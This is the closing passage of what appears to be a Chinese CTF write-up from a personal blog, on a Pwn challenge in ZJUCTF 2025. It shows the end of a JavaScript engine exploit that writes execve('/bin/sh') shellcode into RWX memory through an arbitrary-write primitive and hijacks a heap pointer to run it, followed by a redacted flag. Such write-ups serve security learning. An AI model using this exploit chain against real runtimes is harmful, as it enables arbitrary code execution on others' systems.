class_">ArkTools</span>.<span class="title function_">print</span>(rwx_high.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">'0'</span>));</span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x732f2f2f</span>, <span class="number">0xe7894850</span>, <span class="number">0x1697268</span>, <span class="number">0x24348101</span>, <span class="number">0x1010101</span>, <span class="number">0x6a56f631</span>, <span class="number">0x1485e08</span>, <span class="number">0x894856e6</span>, <span class="number">0x6ad231e6</span>, <span class="number">0x50f583b</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; (shellcode.<span class="property">length</span>) ; i++){</span><br><span class="line">    <span class="title function_">arbitrary_write</span>(rwx_high, rwx_low + <span class="number">4</span> * i, shellcode[i]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbitrary_write</span>(heap_high, heap_low, rwx_low);</span><br><span class="line"><span class="title function_">arbitrary_write</span>(heap_high, heap_low + <span class="number">4</span>, rwx_high);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure>
<p>本地运行截图：</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126170742007.png"></p>
<p>flag：<code>ZJUCTF{****}</code>(保密)</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9Bs8/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">第八届浙江省大学生网络与信息安全竞赛技能赛预赛Pwn方向题解</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 晚栀winegee~
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>